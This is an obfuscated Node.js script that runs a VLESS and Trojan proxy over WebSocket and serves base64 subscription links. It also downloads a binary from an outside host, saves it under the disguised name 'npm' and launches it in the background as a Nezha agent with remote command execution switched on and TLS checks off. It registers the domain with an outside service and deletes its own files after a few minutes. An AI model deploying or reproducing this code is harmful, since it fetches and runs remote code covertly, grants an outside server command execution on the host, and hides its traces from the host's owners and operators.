const _0x1a081f=_0x4451;(function(_0x56575e,_0x2517a0){const _0xb1caee=_0x4451,_0x567216=_0x56575e();while(!![]){try{const _0x247fb0=-parseInt(_0xb1caee(0x18d))/0x1*(parseInt(_0xb1caee(0x1b2))/0x2)+-parseInt(_0xb1caee(0x194))/0x3+-parseInt(_0xb1caee(0x1ad))/0x4*(-parseInt(_0xb1caee(0x1c2))/0x5)+parseInt(_0xb1caee(0x1f9))/0x6*(parseInt(_0xb1caee(0x1a1))/0x7)+-parseInt(_0xb1caee(0x1cd))/0x8+-parseInt(_0xb1caee(0x190))/0x9*(-parseInt(_0xb1caee(0x1f1))/0xa)+parseInt(_0xb1caee(0x1cc))/0xb;if(_0x247fb0===_0x2517a0)break;else _0x567216['push'](_0x567216['shift']());}catch(_0x1ba0f0){_0x567216['push'](_0x567216['shift']());}}}(_0x2a77,0x72ffa));const os=require('os'),http=require(_0x1a081f(0x1ab)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x1a081f(0x1c3)),crypto=require(_0x1a081f(0x1f6)),{Buffer}=require(_0x1a081f(0x1c7)),{exec,execSync}=require(_0x1a081f(0x1b1)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1a081f(0x1e9)][_0x1a081f(0x1a6)]||_0x1a081f(0x1ba),NEZHA_SERVER=process[_0x1a081f(0x1e9)][_0x1a081f(0x1bb)]||'',NEZHA_PORT=process['env'][_0x1a081f(0x1d1)]||'',NEZHA_KEY=process['env'][_0x1a081f(0x1e0)]||'',DOMAIN=process[_0x1a081f(0x1e9)][_0x1a081f(0x1bf)]||_0x1a081f(0x1a5),AUTO_ACCESS=process[_0x1a081f(0x1e9)][_0x1a081f(0x19a)]||!![],WSPATH=process[_0x1a081f(0x1e9)][_0x1a081f(0x195)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x1a081f(0x1e7)]||'sub',NAME=process[_0x1a081f(0x1e9)][_0x1a081f(0x1c0)]||'',PORT=process[_0x1a081f(0x1e9)]['PORT']||0x1eb4;function _0x2a77(){const _0x3d3344=['1408685jhVBwX','path','slice','readUInt16BE',':443?encryption=none&security=tls&sni=','buffer','log','https://amd64.ssss.nyc.mn/agent','Status','text/plain','13686585RPaBIX','7396888UiDXyh','listen','error','8.8.4.4','NEZHA_PORT','decode','hex','pop','writeHead','catch','npm\x20is\x20running','https://','\x20with\x20all\x20DNS\x20servers','message','write','substr','vless://','Server\x20is\x20running\x20on\x20port\x20','base64','NEZHA_KEY','replace','data','/bin/bash','443','2083','chmod\x20+x\x20npm','SUB_PATH',':443?security=tls&sni=','env','&type=A','trojan://','client_secret:\x20','npm\x20running\x20error:','digest','npm\x20is\x20already\x20running,\x20skip\x20running...','https://arm64.ssss.nyc.mn/v1','3740930lqRTyM','&fp=chrome&type=ws&host=','config.yaml','createHash','error:\x20','crypto','stream','isp','1896sIakMW','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','split','end','unlink','send','\x20-p\x20','Answer','utf-8','post','url','readUInt8','reduce','every','setsid\x20nohup\x20./npm\x20-s\x20','true','5SPmcTZ','find','readFile','9ijsGhZ','length','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','text/html','2513205ryPpfC','WSPATH','writeFileSync','concat','test','connect','AUTO_ACCESS','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Unknown','includes','https://arm64.ssss.nyc.mn/agent','2087','--tls','7462htgJgi','map','Automatic\x20Access\x20Task\x20added\x20successfully','then','1234.abc.com','UUID','Not\x20Found\x0a','&path=%2F','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','arch','http','aarch64','12IaOfPK','1.1.1.1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Hello\x20world!','child_process','226806ZypeQf','join','https://api.ip.sb/geoip','finish','pipe','npm','https://amd64.ssss.nyc.mn/v1','from','3b7ef9d8-5038-4d8c-a9b7-73daa7b4859d','NEZHA_SERVER','2096','createWriteStream','trim','DOMAIN','NAME','toString'];_0x2a77=function(){return _0x3d3344;};return _0x2a77();}let ISP='';const GetISP=async()=>{const _0x5dd09c=_0x1a081f;try{const _0x97ba20=await axios[_0x5dd09c(0x1fb)](_0x5dd09c(0x1b4)),_0xae5216=_0x97ba20[_0x5dd09c(0x1e2)];ISP=(_0xae5216['country_code']+'-'+_0xae5216[_0x5dd09c(0x1f8)])[_0x5dd09c(0x1e1)](/ /g,'_');}catch(_0x476843){ISP=_0x5dd09c(0x19c);}};GetISP();const httpServer=http['createServer']((_0x3a208c,_0x3be55d)=>{const _0x182d4d=_0x1a081f;if(_0x3a208c[_0x182d4d(0x187)]==='/'){const _0x3437e3=path[_0x182d4d(0x1b3)](__dirname,'index.html');fs[_0x182d4d(0x18f)](_0x3437e3,'utf8',(_0x556d92,_0x5b9b87)=>{const _0x527841=_0x182d4d;if(_0x556d92){_0x3be55d[_0x527841(0x1d5)](0xc8,{'Content-Type':'text/html'}),_0x3be55d[_0x527841(0x1fd)](_0x527841(0x1b0));return;}_0x3be55d[_0x527841(0x1d5)](0xc8,{'Content-Type':_0x527841(0x193)}),_0x3be55d['end'](_0x5b9b87);});return;}else{if(_0x3a208c[_0x182d4d(0x187)]==='/'+SUB_PATH){const _0x4ae591=NAME?NAME+'-'+ISP:ISP,_0x32fb12=_0x182d4d(0x1dd)+UUID+'@'+DOMAIN+_0x182d4d(0x1c6)+DOMAIN+_0x182d4d(0x1f2)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4ae591,_0x1d9d48=_0x182d4d(0x1eb)+UUID+'@'+DOMAIN+_0x182d4d(0x1e8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x182d4d(0x1a8)+WSPATH+'#'+_0x4ae591,_0x533888=_0x32fb12+'\x0a'+_0x1d9d48,_0x3b093a=Buffer[_0x182d4d(0x1b9)](_0x533888)[_0x182d4d(0x1c1)](_0x182d4d(0x1df));_0x3be55d[_0x182d4d(0x1d5)](0xc8,{'Content-Type':_0x182d4d(0x1cb)}),_0x3be55d['end'](_0x3b093a+'\x0a');}else _0x3be55d[_0x182d4d(0x1d5)](0x194,{'Content-Type':_0x182d4d(0x1cb)}),_0x3be55d['end'](_0x182d4d(0x1a7));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1a081f(0x1e1)](/-/g,''),DNS_SERVERS=[_0x1a081f(0x1d0),_0x1a081f(0x1ae)];function resolveHost(_0x351a6f){return new Promise((_0x1fcd7e,_0x544156)=>{const _0x29b0c7=_0x4451;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x29b0c7(0x198)](_0x351a6f)){_0x1fcd7e(_0x351a6f);return;}let _0x40b20c=0x0;function _0x2e2961(){const _0xfabe08=_0x29b0c7;if(_0x40b20c>=DNS_SERVERS[_0xfabe08(0x191)]){_0x544156(new Error('Failed\x20to\x20resolve\x20'+_0x351a6f+_0xfabe08(0x1d9)));return;}const _0x213b94=DNS_SERVERS[_0x40b20c];_0x40b20c++;const _0x41b0f5='https://dns.google/resolve?name='+encodeURIComponent(_0x351a6f)+_0xfabe08(0x1ea);axios[_0xfabe08(0x1fb)](_0x41b0f5,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0xfabe08(0x1a4)](_0x402233=>{const _0x539dd3=_0xfabe08,_0xd5f0f0=_0x402233[_0x539dd3(0x1e2)];if(_0xd5f0f0[_0x539dd3(0x1ca)]===0x0&&_0xd5f0f0[_0x539dd3(0x184)]&&_0xd5f0f0[_0x539dd3(0x184)][_0x539dd3(0x191)]>0x0){const _0x55968b=_0xd5f0f0[_0x539dd3(0x184)][_0x539dd3(0x18e)](_0x3bed9e=>_0x3bed9e['type']===0x1);if(_0x55968b){_0x1fcd7e(_0x55968b[_0x539dd3(0x1e2)]);return;}}_0x2e2961();})[_0xfabe08(0x1d6)](_0x490ed9=>{_0x2e2961();});}_0x2e2961();});}function handleVlessConnection(_0x48c3a1,_0x21478b){const _0x12f472=_0x1a081f,[_0x4976ad]=_0x21478b,_0x544388=_0x21478b[_0x12f472(0x1c4)](0x1,0x11);if(!_0x544388[_0x12f472(0x18a)]((_0x513f4f,_0x4c8749)=>_0x513f4f==parseInt(uuid[_0x12f472(0x1dc)](_0x4c8749*0x2,0x2),0x10)))return![];let _0x206658=_0x21478b[_0x12f472(0x1c4)](0x11,0x12)[_0x12f472(0x188)]()+0x13;const _0x19cc27=_0x21478b[_0x12f472(0x1c4)](_0x206658,_0x206658+=0x2)['readUInt16BE'](0x0),_0x329884=_0x21478b['slice'](_0x206658,_0x206658+=0x1)[_0x12f472(0x188)](),_0xf5b94f=_0x329884==0x1?_0x21478b[_0x12f472(0x1c4)](_0x206658,_0x206658+=0x4)['join']('.'):_0x329884==0x2?new TextDecoder()[_0x12f472(0x1d2)](_0x21478b[_0x12f472(0x1c4)](_0x206658+0x1,_0x206658+=0x1+_0x21478b[_0x12f472(0x1c4)](_0x206658,_0x206658+0x1)[_0x12f472(0x188)]())):_0x329884==0x3?_0x21478b[_0x12f472(0x1c4)](_0x206658,_0x206658+=0x10)[_0x12f472(0x189)]((_0x4b19c4,_0x46537b,_0x21f844,_0x4b140e)=>_0x21f844%0x2?_0x4b19c4[_0x12f472(0x197)](_0x4b140e[_0x12f472(0x1c4)](_0x21f844-0x1,_0x21f844+0x1)):_0x4b19c4,[])[_0x12f472(0x1a2)](_0x4dea43=>_0x4dea43[_0x12f472(0x1c5)](0x0)['toString'](0x10))['join'](':'):'';_0x48c3a1[_0x12f472(0x1ff)](new Uint8Array([_0x4976ad,0x0]));const _0x4eb489=createWebSocketStream(_0x48c3a1);return resolveHost(_0xf5b94f)[_0x12f472(0x1a4)](_0x2c2ba=>{const _0x5db990=_0x12f472;net[_0x5db990(0x199)]({'host':_0x2c2ba,'port':_0x19cc27},function(){const _0x3d8c1f=_0x5db990;this[_0x3d8c1f(0x1db)](_0x21478b[_0x3d8c1f(0x1c4)](_0x206658)),_0x4eb489['on'](_0x3d8c1f(0x1cf),()=>{})['pipe'](this)['on'](_0x3d8c1f(0x1cf),()=>{})[_0x3d8c1f(0x1b6)](_0x4eb489);})['on']('error',()=>{});})[_0x12f472(0x1d6)](_0x27f86c=>{const _0x4b4ba5=_0x12f472;net[_0x4b4ba5(0x199)]({'host':_0xf5b94f,'port':_0x19cc27},function(){const _0x3acfb9=_0x4b4ba5;this[_0x3acfb9(0x1db)](_0x21478b[_0x3acfb9(0x1c4)](_0x206658)),_0x4eb489['on'](_0x3acfb9(0x1cf),()=>{})[_0x3acfb9(0x1b6)](this)['on'](_0x3acfb9(0x1cf),()=>{})[_0x3acfb9(0x1b6)](_0x4eb489);})['on'](_0x4b4ba5(0x1cf),()=>{});}),!![];}function handleTrojanConnection(_0x23c0a9,_0x59ce94){const _0x2d838d=_0x1a081f;try{if(_0x59ce94['length']<0x3a)return![];const _0x1b56ee=_0x59ce94['slice'](0x0,0x38)[_0x2d838d(0x1c1)](),_0x3586de=[UUID];let _0x123c00=null;for(const _0xdc781b of _0x3586de){const _0x16f207=crypto[_0x2d838d(0x1f4)]('sha224')['update'](_0xdc781b)[_0x2d838d(0x1ee)](_0x2d838d(0x1d3));if(_0x16f207===_0x1b56ee){_0x123c00=_0xdc781b;break;}}if(!_0x123c00)return![];let _0x257a6f=0x38;_0x59ce94[_0x257a6f]===0xd&&_0x59ce94[_0x257a6f+0x1]===0xa&&(_0x257a6f+=0x2);const _0x2195f8=_0x59ce94[_0x257a6f];if(_0x2195f8!==0x1)return![];_0x257a6f+=0x1;const _0x2e8c15=_0x59ce94[_0x257a6f];_0x257a6f+=0x1;let _0xfe5323,_0xb9cac7;if(_0x2e8c15===0x1)_0xfe5323=_0x59ce94[_0x2d838d(0x1c4)](_0x257a6f,_0x257a6f+0x4)[_0x2d838d(0x1b3)]('.'),_0x257a6f+=0x4;else{if(_0x2e8c15===0x3){const _0x345410=_0x59ce94[_0x257a6f];_0x257a6f+=0x1,_0xfe5323=_0x59ce94[_0x2d838d(0x1c4)](_0x257a6f,_0x257a6f+_0x345410)['toString'](),_0x257a6f+=_0x345410;}else{if(_0x2e8c15===0x4)_0xfe5323=_0x59ce94['slice'](_0x257a6f,_0x257a6f+0x10)[_0x2d838d(0x189)]((_0x5953ab,_0x109e6c,_0x5c4dcc,_0x1469a2)=>_0x5c4dcc%0x2?_0x5953ab['concat'](_0x1469a2['slice'](_0x5c4dcc-0x1,_0x5c4dcc+0x1)):_0x5953ab,[])[_0x2d838d(0x1a2)](_0xbb06a0=>_0xbb06a0[_0x2d838d(0x1c5)](0x0)['toString'](0x10))['join'](':'),_0x257a6f+=0x10;else return![];}}_0xb9cac7=_0x59ce94[_0x2d838d(0x1c5)](_0x257a6f),_0x257a6f+=0x2;_0x257a6f<_0x59ce94[_0x2d838d(0x191)]&&_0x59ce94[_0x257a6f]===0xd&&_0x59ce94[_0x257a6f+0x1]===0xa&&(_0x257a6f+=0x2);const _0x10df64=createWebSocketStream(_0x23c0a9);return resolveHost(_0xfe5323)['then'](_0x4286fd=>{const _0x4a4f29=_0x2d838d;net[_0x4a4f29(0x199)]({'host':_0x4286fd,'port':_0xb9cac7},function(){const _0x32bc4d=_0x4a4f29;_0x257a6f<_0x59ce94[_0x32bc4d(0x191)]&&this[_0x32bc4d(0x1db)](_0x59ce94[_0x32bc4d(0x1c4)](_0x257a6f)),_0x10df64['on'](_0x32bc4d(0x1cf),()=>{})[_0x32bc4d(0x1b6)](this)['on'](_0x32bc4d(0x1cf),()=>{})[_0x32bc4d(0x1b6)](_0x10df64);})['on'](_0x4a4f29(0x1cf),()=>{});})[_0x2d838d(0x1d6)](_0x4a7e76=>{const _0x48df6f=_0x2d838d;net['connect']({'host':_0xfe5323,'port':_0xb9cac7},function(){const _0xf53007=_0x4451;_0x257a6f<_0x59ce94[_0xf53007(0x191)]&&this[_0xf53007(0x1db)](_0x59ce94[_0xf53007(0x1c4)](_0x257a6f)),_0x10df64['on']('error',()=>{})['pipe'](this)['on'](_0xf53007(0x1cf),()=>{})['pipe'](_0x10df64);})['on'](_0x48df6f(0x1cf),()=>{});}),!![];}catch(_0x1b496e){return![];}}wss['on']('connection',(_0x5995d8,_0x492091)=>{const _0xd207a8=_0x1a081f,_0x37adc3=_0x492091[_0xd207a8(0x187)]||'';_0x5995d8['once'](_0xd207a8(0x1da),_0x182785=>{const _0x41e010=_0xd207a8;if(_0x182785[_0x41e010(0x191)]>0x11&&_0x182785[0x0]===0x0){const _0x375220=_0x182785[_0x41e010(0x1c4)](0x1,0x11),_0x2bdb30=_0x375220[_0x41e010(0x18a)]((_0x2f6d9c,_0x5648ca)=>_0x2f6d9c==parseInt(uuid[_0x41e010(0x1dc)](_0x5648ca*0x2,0x2),0x10));if(_0x2bdb30){!handleVlessConnection(_0x5995d8,_0x182785)&&_0x5995d8['close']();return;}}!handleTrojanConnection(_0x5995d8,_0x182785)&&_0x5995d8['close']();})['on'](_0xd207a8(0x1cf),()=>{});});function _0x4451(_0x295642,_0x549c61){_0x295642=_0x295642-0x184;const _0x2a7752=_0x2a77();let _0x445160=_0x2a7752[_0x295642];return _0x445160;}const getDownloadUrl=()=>{const _0x3397da=_0x1a081f,_0x5dff66=os[_0x3397da(0x1aa)]();return _0x5dff66==='arm'||_0x5dff66==='arm64'||_0x5dff66===_0x3397da(0x1ac)?!NEZHA_PORT?_0x3397da(0x1f0):_0x3397da(0x19e):!NEZHA_PORT?_0x3397da(0x1b8):_0x3397da(0x1c9);},downloadFile=async()=>{const _0x4540bc=_0x1a081f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x7b87a1=getDownloadUrl(),_0x8c4077=await axios({'method':'get','url':_0x7b87a1,'responseType':_0x4540bc(0x1f7)}),_0x5e8ca6=fs[_0x4540bc(0x1bd)](_0x4540bc(0x1b7));return _0x8c4077[_0x4540bc(0x1e2)][_0x4540bc(0x1b6)](_0x5e8ca6),new Promise((_0x2d9da1,_0x49164f)=>{const _0x27c981=_0x4540bc;_0x5e8ca6['on'](_0x27c981(0x1b5),()=>{const _0x3cfb43=_0x27c981;console[_0x3cfb43(0x1c8)]('npm\x20download\x20successfully'),exec(_0x3cfb43(0x1e6),_0x49dcfe=>{if(_0x49dcfe)_0x49164f(_0x49dcfe);_0x2d9da1();});}),_0x5e8ca6['on']('error',_0x49164f);});}catch(_0xbc4c94){throw _0xbc4c94;}},runnz=async()=>{const _0x18b144=_0x1a081f;try{const _0x3ea349=execSync(_0x18b144(0x1a9),{'encoding':_0x18b144(0x185)});if(_0x3ea349[_0x18b144(0x1be)]()!==''){console[_0x18b144(0x1c8)](_0x18b144(0x1ef));return;}}catch(_0x2b6865){}await downloadFile();let _0x147be8='',_0x25d91f=[_0x18b144(0x1e4),'8443',_0x18b144(0x1bc),_0x18b144(0x19f),_0x18b144(0x1e5),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1d0ef6=_0x25d91f['includes'](NEZHA_PORT)?_0x18b144(0x1a0):'';_0x147be8=_0x18b144(0x18b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x18b144(0x200)+NEZHA_KEY+'\x20'+_0x1d0ef6+_0x18b144(0x192);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3eeccb=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x18b144(0x1fc)](':')[_0x18b144(0x1d4)]():'',_0x34d62c=_0x25d91f[_0x18b144(0x19d)](_0x3eeccb)?_0x18b144(0x18c):'false',_0x3c4ecb=_0x18b144(0x1ec)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x18b144(0x1af)+_0x34d62c+_0x18b144(0x1fa)+UUID;fs[_0x18b144(0x196)](_0x18b144(0x1f3),_0x3c4ecb);}_0x147be8='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x18b144(0x19b));return;}}try{exec(_0x147be8,{'shell':_0x18b144(0x1e3)},_0x3e2033=>{const _0x138775=_0x18b144;if(_0x3e2033)console[_0x138775(0x1cf)](_0x138775(0x1ed),_0x3e2033);else console['log'](_0x138775(0x1d7));});}catch(_0x8060f3){console['error'](_0x18b144(0x1f5)+_0x8060f3);}};async function addAccessTask(){const _0x4ab85c=_0x1a081f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x314de7=_0x4ab85c(0x1d8)+DOMAIN;try{const _0x17720c=await axios[_0x4ab85c(0x186)]('https://oooo.serv00.net/add-url',{'url':_0x314de7},{'headers':{'Content-Type':'application/json'}});console[_0x4ab85c(0x1c8)](_0x4ab85c(0x1a3));}catch(_0x2377af){}}const delFiles=()=>{const _0x2542b4=_0x1a081f;fs[_0x2542b4(0x1fe)](_0x2542b4(0x1b7),()=>{}),fs[_0x2542b4(0x1fe)]('config.yaml',()=>{});};httpServer[_0x1a081f(0x1ce)](PORT,()=>{const _0x290c2c=_0x1a081f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x290c2c(0x1c8)](_0x290c2c(0x1de)+PORT);});
